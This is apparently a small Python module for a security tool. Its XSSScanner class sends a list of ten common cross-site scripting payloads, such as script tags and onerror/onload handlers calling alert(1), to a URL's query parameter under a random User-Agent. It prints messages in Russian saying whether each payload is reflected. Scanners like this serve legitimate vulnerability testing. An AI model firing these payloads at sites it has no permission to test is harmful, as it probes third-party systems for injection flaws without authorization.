from fake_useragent import UserAgent  
import requests

from core.colors import pink, reset

ua = UserAgent().random

class XSScanner:
	def __init__(self, url):
		self.url = url

	def xss_run(self):
		payloads = [
			'<script>alert(1)</script>',
			'"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<math><script>alert(1)</script></math>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)></video>'
		]

		headers = {'User-Agent': ua}

		for payload in payloads:
			params = {'query': payload}

			try:
				response = requests.get(self.url, headers=headers, params=params, timeout=10)

				if response.ok:
					if payload in response.text:
						print(f"{pink}[+] Возможная XSS уязвимость найдена с payload: {payload}{reset}")
					else:
						print(f"[-] Payload не найден в ответе: {payload}")
				else:
					print(f"[!] Сервер вернул код {response.status_code} для payload: {payload}")
			except requests.RequestException as e:
				print(f"[!] Ошибка запроса: {e} для payload: {payload}")

